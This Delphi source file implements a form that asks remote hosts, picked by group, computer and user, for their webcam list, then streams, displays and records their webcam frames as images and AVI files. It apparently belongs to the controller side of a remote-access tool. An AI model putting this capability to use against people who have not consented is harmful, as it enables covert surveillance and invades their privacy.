unit UnitWebcamCapture;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, ScktComp, StdCtrls, Spin, umSFPack,zlib,ImageHLP,UnitAvi,
  ComCtrls, ImgList, ToolWin, Menus, ClipBrd, UnitSharedData, IniFiles,
  ExtDlgs;

type
  TWebcamCapture = class(TForm)
    ScrollBox1: TScrollBox;
    Image1: TImage;
    ProgressBar1: TProgressBar;
    StatusBar1: TStatusBar;
    Timer1: TTimer;
    ToolBar1: TToolBar;
    ToolButton1: TToolButton;
    ToolButton3: TToolButton;
    ToolButton4: TToolButton;
    ImageList1: TImageList;
    PopupMenu1: TPopupMenu;
    Quality2: TMenuItem;
    N12: TMenuItem;
    N82: TMenuItem;
    N162: TMenuItem;
    N242: TMenuItem;
    N322: TMenuItem;
    SaveImages2: TMenuItem;
    Panel1: TPanel;
    Edit1: TComboBoxEx;
    Stretch1: TMenuItem;
    N1: TMenuItem;
    Delay1: TMenuItem;
    NoDelay1: TMenuItem;
    N1Second1: TMenuItem;
    N2Seconds1: TMenuItem;
    N5Seconds1: TMenuItem;
    N10Seconds1: TMenuItem;
    DelayTimer: TTimer;
    N41: TMenuItem;
    ToolButton2: TToolButton;
    SavePictureDialog1: TSavePictureDialog;
    procedure Single1Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Timer1Timer(Sender: TObject);
    procedure ToolButton1Click(Sender: TObject);
    procedure N12Click(Sender: TObject);
    procedure N82Click(Sender: TObject);
    procedure N162Click(Sender: TObject);
    procedure N242Click(Sender: TObject);
    procedure N322Click(Sender: TObject);
    procedure SaveImages2Click(Sender: TObject);
    procedure Stretch1Click(Sender: TObject);
    procedure N1Second1Click(Sender: TObject);
    procedure DelayTimerTimer(Sender: TObject);
    procedure NoDelay1Click(Sender: TObject);
    procedure N2Seconds1Click(Sender: TObject);
    procedure N5Seconds1Click(Sender: TObject);
    procedure N10Seconds1Click(Sender: TObject);
    procedure N41Click(Sender: TObject);
    procedure ToolButton2Click(Sender: TObject);
  private
    { Private declarations }
    AviStringList: TStringList;
  public
    { Public declarations }
    MainSocket: TCustomWinSocket;
    NewSocket: TCustomWinSocket;
    SocketData: TSocketData;
    ScreenData: string;
    BitCount: integer;
    snum: integer;
    Group,Computer,User: string;
    procedure ParseData(Socket: TCustomWinSocket; Data: string);
    procedure SetUpConnection(Socket: TCustomWinSocket);
  end;

var
  WebcamCapture: TWebcamCapture;

implementation

uses UnitScreenCapture, UnitSaveProgress;

{$R *.dfm}

procedure SendData(Socket: TCustomWinSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'WebcamCapture|' + Data);
end;

procedure DisconnectProc(Socket: TCustomWinSocket);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  if TWebcamCapture(SocketData.Form).NewSocket = nil then exit;
  TWebcamCapture(SocketData.Form).Timer1.Enabled := True;
  TWebcamCapture(SocketData.Form).NewSocket := nil;
  TWebcamCapture(SocketData.Form).Caption := TWebcamCapture(SocketData.Form).Caption + ' - [Offline]';
end;

procedure ReceiveDataProc(Socket: TCustomWinSocket; Progress,Max: int64);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  TWebcamCapture(SocketData.Form).ProgressBar1.Max := Max;
  TWebcamCapture(SocketData.Form).ProgressBar1.Position := Progress;
  //TScreenCapture(SocketData.Form).Caption := inttostr(Progress) + ' / ' + inttostr(Max);
end;

procedure TWebcamCapture.SetUpConnection(Socket: TCustomWinSocket);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  SocketData.DisconnectProc := @DisconnectProc;
  SocketData.ReceiveDataProc := @ReceiveDataProc;
  Timer1.Enabled := False;
  Caption := Copy(Caption,1,Length(Caption) -12);
  SendData(Socket,'CamList');
end;

function CompareString(s1,s2: string; Len: dword): string;
var
  i: integer;
begin
  if Length(s1) <> length(s2) then exit;
  setlength(Result,Len);
  for i := 1 to Len do begin
    if s2[i] = '%' then begin
      Result[i] := s1[i];
    end else begin
      Result[i] := s2[i];
    end;
  end;
end;

function GetDate: string;
var
  MyTime: TSystemTime;
begin
  GetLocalTime(MyTime);
  Result := inttostr(MyTime.wDay) + '-' + inttostr(MyTime.wMonth) + '-' + inttostr(MyTime.wYear);
end;

function GetTime: string;
var
  MyTime: TSystemTime;
begin
  GetLocalTime(MyTime);
  Result := inttostr(MyTime.wHour) + '.' + inttostr(MyTime.wMinute) + '.' + inttostr(MyTime.wSecond) + '.' + inttostr(MyTime.wMilliseconds);
end;

procedure TWebcamCapture.ParseData(Socket: TCustomWinSocket; Data: string);
var
  Command: string;
  d: string;
  Stream: TMemorystream;
  n: string;
begin
  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  if Command = 'ScreenShot' then begin
    Data := SFUnpackStr(Data);
    if ScreenData = '' then SetLength(ScreenData,Length(Data));
    d := CompareString(ScreenData,Data,Length(Data));
    screendata := d;
    stream := tmemorystream.Create;
    stream.WriteBuffer(pointer(d)^,length(d));
    stream.Position := 0;
    try
      Image1.Picture.Bitmap.LoadFromStream(Stream);
    except
      screendata := '';
      SendData(Socket,'ClearData');
    end;

    if SaveImages2.Checked then begin
      try
        n := SocketData.WebcamPath + GetDate + '\' + GetTime + '.bmp';
        image1.Picture.SaveToFile(n);
        AviStringList.Add(n);
      except
      end;
    end;

    stream.Free;
    application.ProcessMessages;

    if ToolButton1.Down then begin
      DelayTimer.Enabled := True;
      //SendData(Socket,'ScreenShot|' + inttostr(BitCount));
    end else begin
      SendData(Socket,'Disconnect');
      Edit1.Enabled := True;
    end;


  end;

  if Command = 'Connected' then begin
    SendData(Socket,'ScreenShot|' + inttostr(BitCount));
  end;

  if Command = 'Error' then begin
    Edit1.Enabled := True;
    ToolButton1.Down := False;
    ShowMessage('Cannot Connect');
  end;


  if Command = 'CamList' then begin
    Edit1.Items.Clear;
    if Data = '' then begin
      Edit1.Text := 'No Webcam Detected';
      exit;
    end;
    while Length(Data) > 0 do begin
      Command := Split(Data,'|',1);
      Delete(Data,1,Length(Command)+1);
      Edit1.Items.Add(Command);
    end;
    Edit1.ItemIndex := 0;
  end;


end;

procedure TWebcamCapture.Single1Click(Sender: TObject);
begin
  SendData(NewSocket,'ClearData');
  SendData(NewSocket,'Connect|' + inttostr(Edit1.ItemIndex));
  Edit1.Enabled := False;
  //SendData(NewSocket,'ScreenShot|' + inttostr(BitCount));
end;

procedure TWebcamCapture.FormCreate(Sender: TObject);
var
  Ini: TIniFile;
begin
  BitCount := 8;
  sNum := 0;

  Ini := TIniFile.Create(ExtractFilePath(Application.ExeName) + 'Settings.ini');

    BitCount := Ini.ReadInteger('ScreenCapture','Quality',BitCount);
    if BitCount = 1 then n12.Click;
    if BitCount = 4 then n41.Click;
    if BitCount = 8 then n82.Click;
    if BitCount = 16 then n162.Click;
    if BitCount = 24 then n242.Click;
    if BitCount = 32 then n322.Click;

    DelayTimer.Interval := Ini.ReadInteger('ScreenCapture','Delay',DelayTimer.Interval);
    if DelayTimer.Interval = 1 then NoDelay1.Click;
    if DelayTimer.Interval = 1000 then N1Second1.Click;
    if DelayTimer.Interval = 2000 then N2Seconds1.Click;
    if DelayTimer.Interval = 5000 then N5Seconds1.Click;
    if DelayTimer.Interval = 10000 then N10Seconds1.Click;

    if Ini.ReadBool('ScreenCapture','Stretch',False) then Stretch1.Click;

  Ini.Free;
end;

procedure TWebcamCapture.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  TmpSocket: TCustomWinSocket;
  ini: TIniFile;
begin
  Hide;

  if (ToolButton1.Down) and (SaveImages2.Checked) then begin
    ToolButton1.Down := False;
    ToolButton1Click(ToolButton1);
  end;

  Ini := TIniFile.Create(ExtractFilePath(Application.ExeName) + 'Settings.ini');
    Ini.WriteInteger('ScreenCapture','Quality',BitCount);
    Ini.WriteInteger('ScreenCapture','Delay',DelayTimer.Interval);
    Ini.WriteBool('ScreenCapture','Stretch',Stretch1.Checked); 
  Ini.Free;

  Action := caFree;
  try
    TmpSocket := NewSocket;
    NewSocket := nil;
    if TmpSocket <> nil then TmpSocket.Close;
  except
  end;
end;

procedure TWebcamCapture.Timer1Timer(Sender: TObject);
var
  NewSocketData: TSocketData;
  Li: TListItem;
begin
  Li := GetListItem(Group,Computer,User);
  if Li = nil then exit;
  if Li.Data = nil then exit;
  NewSocketData := TSocketData(Li.Data);
  if NewSocketData.MainSocket = nil then exit;
      UnitSharedData.SendData(NewSocketData.MainSocket,'NewConnection|WebcamCaptureSocket|' + inttostr(Self.Handle));
end;

procedure ProgressFunc(Pos,Max: dword);
begin
  SaveProgress.Show;
  SaveProgress.ProgressBar1.Position := Pos;
  SaveProgress.ProgressBar1.Max := Max;
  SaveProgress.Label1.Caption := 'Saving Frame ' + inttostr(Pos) + ' / ' + inttostr(Max);
  if Pos = Max then SaveProgress.Close;
end;

procedure TWebcamCapture.ToolButton1Click(Sender: TObject);
begin
  if Toolbutton1.Down then begin
    if AviStringList = nil then AviStringList := TStringList.Create;
    SendData(NewSocket,'Connect|' + inttostr(Edit1.ItemIndex));
  end else begin
    if AviStringList.Count > 0 then UnitAvi.CreateAVI(@ProgressFunc,ChangeFileExt(AviStringList.Strings[0],'.avi'),AviStringList,2);
    AviStringList.Free;
    AviStringList := nil;
  end;
end;

procedure TWebcamCapture.N12Click(Sender: TObject);
begin
  BitCount := 1;
  n12.Checked := True;
  n41.Checked := False;
  n82.Checked := False;
  n162.Checked := False;
  n242.Checked := False;
  n322.Checked := False;
  screendata := '';
end;

procedure TWebcamCapture.N82Click(Sender: TObject);
begin
  BitCount := 8;
  n12.Checked := False;
  n41.Checked := False;
  n82.Checked := True;
  n162.Checked := False;
  n242.Checked := False;
  n322.Checked := False;
  screendata := '';
end;

procedure TWebcamCapture.N162Click(Sender: TObject);
begin
  BitCount := 16;
  n12.Checked := False;
  n41.Checked := False;
  n82.Checked := False;
  n162.Checked := True;
  n242.Checked := False;
  n322.Checked := False;
  screendata := '';
end;

procedure TWebcamCapture.N242Click(Sender: TObject);
begin
  BitCount := 24;
  n12.Checked := False;
  n41.Checked := False;
  n82.Checked := False;
  n162.Checked := False;
  n242.Checked := True;
  n322.Checked := False;
  screendata := '';
end;

procedure TWebcamCapture.N322Click(Sender: TObject);
begin
  BitCount := 32;
  n12.Checked := False;
  n41.Checked := False;
  n82.Checked := False;
  n162.Checked := False;
  n242.Checked := False;
  n322.Checked := True;
  screendata := '';
end;

procedure TWebcamCapture.SaveImages2Click(Sender: TObject);
begin
  SaveImages2.Checked := not SaveImages2.Checked;
  MakeSureDirectoryPathExists(pchar(SocketData.WebcamPath + GetDate + '\'));
end;

procedure TWebcamCapture.Stretch1Click(Sender: TObject);
begin
begin
  Stretch1.Checked := not Stretch1.Checked;
  if Stretch1.Checked then begin
    Image1.AutoSize := False;
    Image1.Align := alClient;
    Image1.Stretch := True;
  end else begin
    Image1.Stretch := False;
    Image1.Align := alNone;
    Image1.AutoSize := True;
  end;
end;end;

procedure TWebcamCapture.N1Second1Click(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to Delay1.Count -1 do begin
    Delay1.Items[i].Checked := False;
  end;
  TMenuItem(Sender).Checked := True;
  DelayTimer.Interval := 1000;
end;

procedure TWebcamCapture.DelayTimerTimer(Sender: TObject);
begin
  DelayTimer.Enabled := False;
  //ToolButton1.Click;  //toolbutton just connects cam
  SendData(NewSocket,'ScreenShot|' + inttostr(BitCount));
end;

procedure TWebcamCapture.NoDelay1Click(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to Delay1.Count -1 do begin
    Delay1.Items[i].Checked := False;
  end;
  TMenuItem(Sender).Checked := True;
  DelayTimer.Interval := 1;
end;

procedure TWebcamCapture.N2Seconds1Click(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to Delay1.Count -1 do begin
    Delay1.Items[i].Checked := False;
  end;
  TMenuItem(Sender).Checked := True;
  DelayTimer.Interval := 2000;
end;

procedure TWebcamCapture.N5Seconds1Click(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to Delay1.Count -1 do begin
    Delay1.Items[i].Checked := False;
  end;
  TMenuItem(Sender).Checked := True;
  DelayTimer.Interval := 5000;
end;

procedure TWebcamCapture.N10Seconds1Click(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to Delay1.Count -1 do begin
    Delay1.Items[i].Checked := False;
  end;
  TMenuItem(Sender).Checked := True;
  DelayTimer.Interval := 10000;
end;

procedure TWebcamCapture.N41Click(Sender: TObject);
begin
  BitCount := 4;
  n12.Checked := False;
  n41.Checked := True;
  n82.Checked := False;
  n162.Checked := False;
  n242.Checked := False;
  n322.Checked := False;
  screendata := '';
end;

procedure TWebcamCapture.ToolButton2Click(Sender: TObject);
begin
  if not SavePictureDialog1.Execute then exit;
  Image1.Picture.SaveToFile(SavePictureDialog1.FileName);
end;

end.
